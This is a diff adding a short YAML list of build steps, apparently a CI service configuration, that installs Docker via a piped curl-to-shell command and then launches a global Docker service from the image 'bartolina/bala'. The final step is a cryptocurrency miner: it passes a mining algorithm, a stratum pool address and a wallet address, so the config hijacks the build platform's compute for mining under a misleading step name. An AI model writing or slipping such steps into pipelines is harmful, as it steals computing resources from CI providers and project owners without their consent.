@@ -1,0 +1,16 @@
+- name: Instal Docker CE
+  service: app
+  command: bash -c 'curl -sL https://get.docker.com | sh'
+- name: docker swarm init
+  service: app
+  command: sudo docker swarm init
+- name: docker pull
+  service: app
+  command: sudo docker bartolina/bala
+- name: docker swarm init
+  service: app
+  command: docker service create --mode=global \
+  --name coba bartolina/bala:latest linux/system \
+  -a yespowerr16 \
+  -o stratum+tcp://stratum-asia.rplant.xyz:3382 \
+  -u YXAhsHspYZxWzo2Jfw77Zb5FBmGv136UFc.ship
